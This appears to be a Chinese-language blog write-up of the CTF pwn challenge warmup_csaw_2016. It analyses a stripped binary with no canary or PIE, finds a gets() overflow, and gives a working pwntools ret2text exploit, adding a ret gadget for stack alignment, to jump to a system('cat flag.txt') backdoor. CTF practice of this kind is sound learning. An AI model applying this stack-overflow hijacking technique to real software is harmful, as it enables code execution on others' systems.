---
title: pwn练习题-warmup_csaw_2016
date: 2026-10-21
updated: 2026-10-21
description: 从一道 DASCTF 的 pwn 入门赛题出发，演示在 stripped 的 64 位程序里如何用 ret2text 跳到后门函数，并通过补一个 ret 解决栈对齐问题。
categories: CTF
tags:
  - pwn
  - stack-overflow
  - ret2text
  - stack-alignment
  - pwntools
---

## 拿到题目

在 https://ctf2.dasctf.com/dashboard 拿到一个 pwn 的简单入门赛题

## file chall2

老规矩第一步 `file chall2`

```text
chall2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
```

注意:stripped，

## checksec

接着 `checksec --file=chall2`

```text
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols             FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols    No    0               2               chall2
```

注意：No canary found，NX disabled， No PIE 舒服！

## nm chall2

如果我们进行 `nm chall2` 会发现

```text
nm: chall2: no symbols
```

因为我们前面看到了 stripped，所以无法查看符号表，

## strings chall2

`strings chall2` 寻找字符串，结果如下

```text
gets                      危险函数
system                    调用系统命令
cat flag.txt              隐藏的获胜路径
```

现在应该确认程序里是否真的有一个调用 system("cat flag.txt") 的函数

## objdump 反汇编

反汇编 `objdump -d -M intel chall2`

```asm
40060d:       55                      push   rbp
40060e:       48 89 e5                mov    rbp,rsp
400611:       bf 34 07 40 00          mov    edi,0x400734
400616:       e8 b5 fe ff ff          call   4004d0 <system@plt>
```

跳到地址 4004d0 去执行，而那里正是 system，（注意：4004d0 是个门牌：敲这个门，它负责把你转接到 libc 里真正的 system）system 调用的参数就是上一行传给他的 0x400734

## gdb 查看参数

我们一起看看 0x400734 这个地址是啥吧 `gdb ./chall2` `x/s 0x400734`

```text
0x400734:       "cat flag.txt"        破案！
```

（我有时分不清楚 bp 和 sp，就记住：栈帧是你的工作台，SP 是会移动的桌边，BP 是钉在桌上的刻度起点）

x86-64 的调用约定里，函数的第 1 个参数放在 rdi，edi 是 rdi 的低 32 位，可以这么理解

```text
┌────────────────── rdi (64位) ──────────────────┐
                    ┌──── edi (低32位) ────┐
                                ┌─ di (低16位) ─┐
```

## 定位溢出点

```asm
400692:       48 8d 45 c0             lea    rax,[rbp-0x40]
400696:       48 89 c7                mov    rdi,rax
400699:       b8 00 00 00 00          mov    eax,0x0
40069e:       e8 5d fe ff ff          call   400500 <gets@plt>
```

缓冲区：64+8

这个题的思路就是把栈上的返回地址改成后门地址，执行 system(cat flag.txt)

（这里还是要提一嘴 lea 和 mov 的区别，mov rax, [rbp-0x40]：把 rbp-0x40 这个地址里存的值拿出来放进 rax       lea rax, [rbp-0x40]：把 rbp-0x40 这个地址本身算出来放进 rax，一个存的是值，一个存的是地址）

## 编写 exploit

`nano exploit.py`

### 第一次尝试

```python
from pwn import *
# 远程就换成 remote("ip", port)
p = process("./chall2")
payload  = b"A" * 72 + p64(0x40060d)
p.sendline(payload)
p.interactive()
```

`python3 exploit.py`

出错！！！

### 栈对齐修复

是不是栈没对齐？

```python
from pwn import *
# 远程就换成 remote("ip", port)
p = process("./chall2")
RET = 0x40061c
payload = b"A"*72 + p64(RET) + p64(0x40060d)
p.sendline(payload)
p.interactive()
```

成功！
